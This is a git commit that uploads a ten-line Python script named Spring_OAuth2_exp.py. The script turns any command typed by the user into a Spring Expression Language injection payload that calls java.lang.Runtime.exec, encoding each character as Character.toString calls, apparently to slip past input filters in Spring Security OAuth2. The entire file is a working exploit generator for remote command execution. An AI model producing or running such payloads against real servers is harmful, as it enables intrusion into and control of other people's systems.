13c4ed6235debf98f41d36cfe363f244e6b51ea0
shanfenglan <839735789@qq.com>
2021-12-30 16:10:45 +0800

    Add files via upload

---
+++ Spring_OAuth2_exp.py
@@ -0,0 +1,10 @@
+message = input('Enter message to encode:')
+
+poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])
+
+for ch in message[1:]:
+   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) 
+
+poc += ')}'
+
+print(poc)
